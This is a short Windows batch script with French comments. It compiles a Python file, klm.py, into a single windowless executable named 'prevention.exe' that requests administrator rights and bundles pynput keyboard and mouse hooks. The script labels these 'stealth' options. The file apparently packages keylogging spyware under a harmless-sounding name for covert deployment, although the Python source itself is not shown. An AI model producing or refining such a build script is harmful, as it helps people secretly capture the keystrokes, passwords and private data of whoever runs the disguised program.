@echo off
chcp 65001 >nul
echo Compile .py to .exe phantom auto
echo.

REM 1. Installe PyInstaller si besoin
pip install pyinstaller

REM 2. Compile avec options de stealth
pyinstaller --onefile --noconsole --name "prevention" ^
  --add-data ".;." ^
  --hidden-import pynput.keyboard._win32 ^
  --hidden-import pynput.mouse._win32 ^
  --uac-admin ^
  klm.py

echo.
echo ✅ Compilation terminée!
echo Fichier: dist\prevention.exe
echo.
pause